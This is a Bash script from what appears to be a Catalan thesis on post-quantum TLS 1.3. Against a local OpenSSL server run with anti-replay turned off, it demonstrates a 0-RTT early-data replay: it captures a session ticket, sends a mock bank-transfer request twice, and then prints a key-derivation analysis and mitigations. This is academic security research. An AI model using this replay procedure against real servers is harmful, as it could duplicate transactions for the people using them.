#!/bin/bash
set -e

# =============================================================================
# TFG: Seguretat Post-Quàntica en TLS 1.3
# Atac A2 — Replay Attack sobre 0-RTT / Early Data (§4.2.2)
# =============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CERTS_DIR="$(cd "$SCRIPT_DIR/../../certs" && pwd)"
RESULTS_DIR="$SCRIPT_DIR/results"

PORT=4436
SRV_PID=""

# =============================================================================
# FUNCIONS AUXILIARS
# =============================================================================

cleanup() {
    [ -n "$SRV_PID" ] && kill "$SRV_PID" 2>/dev/null && wait "$SRV_PID" 2>/dev/null || true
}
trap cleanup EXIT

save_result() {
    local file="$1"
    local content="$2"
    if [ -f "$file" ] && [ "${OVERWRITE:-0}" != "1" ]; then
        echo "  [SKIP] $file ja existeix. Usa --overwrite per sobreescriure."
    else
        printf '%s\n' "$content" > "$file"
        echo "  [SAVED] $file"
    fi
}

print_header() {
    echo ""
    echo "============================================================"
    echo "  $1"
    echo "============================================================"
}

start_server() {
    local extra_flags="$*"
    openssl s_server \
        -cert "$CERTS_DIR/server.crt" \
        -key  "$CERTS_DIR/server.key" \
        -port "$PORT" \
        -tls1_3 \
        -groups "X25519MLKEM768" \
        -provider oqsprovider \
        -provider default \
        $extra_flags \
        -www -quiet \
        2>/dev/null &
    SRV_PID=$!
    sleep 1.5
}

stop_server() {
    [ -n "$SRV_PID" ] && kill "$SRV_PID" 2>/dev/null && wait "$SRV_PID" 2>/dev/null || true
    SRV_PID=""
    sleep 0.5
}

# =============================================================================
# PARSE ARGUMENTS
# =============================================================================

for arg in "$@"; do
    case $arg in
        --overwrite) OVERWRITE=1 ;;
    esac
done

# =============================================================================
# VALIDACIONS PRÈVIES
# =============================================================================

print_header "A2 — 0-RTT Replay: Validació de l'entorn"

[ -f "$CERTS_DIR/server.crt" ] || { echo "ERROR: No trobat $CERTS_DIR/server.crt"; exit 1; }
[ -f "$CERTS_DIR/server.key" ] || { echo "ERROR: No trobat $CERTS_DIR/server.key"; exit 1; }
[ -f "$SCRIPT_DIR/kdf_analysis.py" ] || { echo "ERROR: No trobat $SCRIPT_DIR/kdf_analysis.py"; exit 1; }

mkdir -p "$RESULTS_DIR"

# Crea el payload si no existeix
if [ ! -f "$RESULTS_DIR/early_payload.txt" ]; then
    printf 'POST /transfer HTTP/1.0\r\nHost: localhost\r\nContent-Length: 21\r\n\r\namount=1000&dest=eve' \
        > "$RESULTS_DIR/early_payload.txt"
    echo "  [CREATED] early_payload.txt"
fi

echo "  CERTS_DIR  : $CERTS_DIR"
echo "  RESULTS_DIR: $RESULTS_DIR"
echo "  Port       : $PORT"

# =============================================================================
# PAS 1 — CONNEXIÓ INICIAL: OBTENIR SESSION TICKET
# =============================================================================

print_header "PAS 1 — Connexió inicial: obtenció del Session Ticket"

TICKET_FILE="$RESULTS_DIR/session_ticket.pem"

if [ -f "$TICKET_FILE" ] && [ "${OVERWRITE:-0}" != "1" ]; then
    echo "  [SKIP] session_ticket.pem ja existeix, reutilitzant."
else
    echo "  Arrencant servidor amb -early_data al port $PORT..."
    start_server -early_data

    echo "  Connexió inicial per obtenir NewSessionTicket..."
    OUTPUT_1=$(( echo "GET / HTTP/1.0"; echo; sleep 3 ) | openssl s_client \
        -connect "localhost:$PORT" \
        -tls1_3 \
        -groups "X25519MLKEM768" \
        -provider oqsprovider \
        -provider default \
        -CAfile "$CERTS_DIR/server.crt" \
        -sess_out "$TICKET_FILE" \
        2>&1 || true)

    save_result "$RESULTS_DIR/a2_step1_initial.txt" "$OUTPUT_1"
    stop_server
fi

# Verifica ticket
if [ -f "$TICKET_FILE" ] && grep -q "BEGIN SSL SESSION PARAMETERS" "$TICKET_FILE"; then
    echo "  ✅ Session ticket obtingut: $TICKET_FILE"
    # Extreu Max Early Data si possible
    MAX_ED=$(grep "Max Early Data" "$RESULTS_DIR/a2_step1_initial.txt" 2>/dev/null | head -1 || echo "  (no detectat al fitxer)")
    echo "  $MAX_ED"
else
    echo ""
    echo "  ⚠️  ATENCIÓ: No s'ha pogut obtenir el session ticket automàticament."
    echo "     Possible causa: el servidor ha tancat la connexió abans d'enviar"
    echo "     el NewSessionTicket (missatge post-handshake asíncron en TLS 1.3)."
    echo "     Solució manual: augmenta el sleep o executa manualment:"
    echo "     ( echo 'GET / HTTP/1.0'; echo; sleep 5 ) | openssl s_client \\"
    echo "       -connect localhost:$PORT -tls1_3 -groups X25519MLKEM768 \\"
    echo "       -provider oqsprovider -provider default \\"
    echo "       -CAfile $CERTS_DIR/server.crt \\"
    echo "       -sess_out $TICKET_FILE"
    echo "     Continuant amb anàlisi KDF (independent del ticket)..."
fi

# =============================================================================
# PAS 2 — CONNEXIÓ LEGÍTIMA AMB SESSION TICKET (RESUM)
# =============================================================================

print_header "PAS 2 — Connexió legítima amb Session Ticket (resumption)"

if [ ! -f "$TICKET_FILE" ]; then
    echo "  [SKIP] No hi ha ticket disponible. Omitint Pas 2."
else
    echo "  Arrencant servidor amb -early_data i -no_anti_replay al port $PORT..."
    start_server -early_data -no_anti_replay

    echo "  Connexió de resum (reutilitza ticket)..."
    OUTPUT_2=$( (sleep 2) | openssl s_client \
        -connect "localhost:$PORT" \
        -tls1_3 \
        -groups "X25519MLKEM768" \
        -provider oqsprovider \
        -provider default \
        -CAfile "$CERTS_DIR/server.crt" \
        -sess_in "$TICKET_FILE" \
        2>&1 || true)

    echo ""
    echo "$OUTPUT_2" | grep -E "Reused|Session-ID|Negotiated|Cipher|Early data" || true
    echo ""

    if echo "$OUTPUT_2" | grep -qiE "Reused|Resumption"; then
        echo "  ✅ Sessió reutilitzada correctament (PSK resumption)"
    else
        echo "  [INFO] Reviseu l'output manualment — pot haver caducat el ticket."
    fi

    save_result "$RESULTS_DIR/a2_step2_legitimate.txt" "$OUTPUT_2"
    stop_server
fi

# =============================================================================
# PAS 3 — CONNEXIÓ 0-RTT AMB EARLY DATA
# =============================================================================

print_header "PAS 3 — Enviament 0-RTT i Replay Attack"

if [ ! -f "$TICKET_FILE" ]; then
    echo "  [SKIP] No hi ha ticket disponible. Omitint Pas 3."
else
    echo "  Arrencant servidor amb -early_data i -no_anti_replay al port $PORT..."
    start_server -early_data -no_anti_replay

    echo "  --- Enviament LEGÍTIM early_data ---"
    OUTPUT_3A=$( (sleep 2) | openssl s_client \
        -connect "localhost:$PORT" \
        -tls1_3 \
        -groups "X25519MLKEM768" \
        -provider oqsprovider \
        -provider default \
        -CAfile "$CERTS_DIR/server.crt" \
        -sess_in "$TICKET_FILE" \
        -early_data "$RESULTS_DIR/early_payload.txt" \
        2>&1 || true)

    EARLY_STATUS=$(echo "$OUTPUT_3A" | grep "Early data" || echo "  Early data: (no trobat)")
    echo "  $EARLY_STATUS"
    save_result "$RESULTS_DIR/a2_step2_legitimate.txt" "$OUTPUT_3A"

    sleep 1

    echo ""
    echo "  --- REPLAY: mateix ticket, mateixa early_data ---"
    OUTPUT_3B=$( (sleep 2) | openssl s_client \
        -connect "localhost:$PORT" \
        -tls1_3 \
        -groups "X25519MLKEM768" \
        -provider oqsprovider \
        -provider default \
        -CAfile "$CERTS_DIR/server.crt" \
        -sess_in "$TICKET_FILE" \
        -early_data "$RESULTS_DIR/early_payload.txt" \
        2>&1 || true)

    REPLAY_STATUS=$(echo "$OUTPUT_3B" | grep "Early data" || echo "  Early data: (no trobat)")
    echo "  $REPLAY_STATUS"
    save_result "$RESULTS_DIR/a2_step3_replay.txt" "$OUTPUT_3B"
    echo ""

    if echo "$OUTPUT_3B" | grep -qi "Early data was accepted"; then
        echo "  ⚠️  REPLAY CONFIRMAT: 'Early data was accepted' dues vegades"
        echo "      El servidor ha processat el payload dues vegades amb el"
        echo "      mateix ticket. Condició C4 violada."
    elif echo "$OUTPUT_3B" | grep -qi "Early data was rejected"; then
        echo "  [INFO] Anti-replay actiu per defecte en aquesta configuració."
        echo "         El replay ha estat bloquejat pel servidor."
        echo "         NOTA per al TFG: la vulnerabilitat és de disseny del protocol"
        echo "         (RFC 8446 §8.3). La defensa anti-replay és responsabilitat del"
        echo "         servidor i no és activa per defecte en tots els desplegaments."
    else
        echo "  [INFO] Estat early_data: revisar output manualment."
    fi

    stop_server
fi

# =============================================================================
# PAS 4 — ANÀLISI KDF (DEMOSTRACIÓ FORMAL)
# =============================================================================

print_header "PAS 4 — Anàlisi KDF: absència de K_KEM a K_early"

echo "  Executant kdf_analysis.py..."
KDF_OUTPUT=$(python3 "$SCRIPT_DIR/kdf_analysis.py" 2>&1 || true)
echo ""
echo "$KDF_OUTPUT"
echo ""
save_result "$RESULTS_DIR/a2_kdf_output.txt" "$KDF_OUTPUT"

if echo "$KDF_OUTPUT" | grep -q "Iguals: True"; then
    echo "  ✅ kdf_analysis.py confirmat: K_early és determinista (Iguals: True)"
else
    echo "  [INFO] Revisar output de kdf_analysis.py manualment."
fi

# =============================================================================
# PAS 5 — CONCLUSIÓ HNDL
# =============================================================================

print_header "PAS 5 — Implicació HNDL del mode 0-RTT"

echo ""
echo "  PROBLEMA FONAMENTAL (RFC 8446 §8.3 + §4.2.2 TFG):"
echo ""
echo "  K_early = HKDF(PSK, 'c e traffic', H(ClientHello))"
echo "            ↑ sense K_KEM  ↑ sense K_ECDH efímer"
echo ""
echo "  Les dades early_data s'xifren amb K_early, derivada ÚNICAMENT del PSK"
echo "  del session ticket anterior. No hi ha contribució del nou material efímer"
echo "  ML-KEM ni X25519 de la sessió en curs."
echo ""
echo "  Conseqüències:"
echo "  1. REPLAY (demostrat): qualsevol entitat amb accés al ticket pot reenviar"
echo "     el mateix early_data sense necessitat de cap clau criptogràfica addicional."
echo ""
echo "  2. HNDL: un adversari que emmagatzemi connexions 0-RTT avui pot desxifrar-les"
echo "     en el futur si obté el PSK (p.ex. per compromís del servidor), fins i tot"
echo "     SENSE CRQC — el mode 0-RTT no té Forward Secrecy post-quàntica."
echo ""
echo "  3. CONTRAST amb el canal principal:"
echo "     K_handshake = HKDF(PSK + K_KEM || K_ECDH, ...)"
echo "     → inclou material efímer X25519MLKEM768 nou a cada sessió"
echo "     → Replay impossible per al canal principal"

# =============================================================================
# TAULA RESUM
# =============================================================================

print_header "RESUM — Atac A2 0-RTT Replay"

echo ""
echo "  ┌────────────────────────────┬─────────────────────┬───────────────────────────┐"
echo "  │ Component                  │ Inclou K_KEM?       │ Vulnerable a Replay/HNDL? │"
echo "  ├────────────────────────────┼─────────────────────┼───────────────────────────┤"
echo "  │ K_early (0-RTT)            │ ❌ No               │ ✅ Sí (disseny del proto) │"
echo "  │ K_handshake (canal normal) │ ✅ Sí               │ ❌ No                     │"
echo "  │ K_app (dades aplicació)    │ ✅ Sí               │ ❌ No                     │"
echo "  └────────────────────────────┴─────────────────────┴───────────────────────────┘"
echo ""
echo "  CONCLUSIÓ (Cap. 4 §4.2.2):"
echo "  El mode 0-RTT viola la condició C4 del §3.5.3. Les dades early_data no"
echo "  gaudeixen de Forward Secrecy post-quàntica. La mitigació és deshabilitar"
echo "  0-RTT per a dades sensibles o implementar detecció de replay al servidor."
echo ""
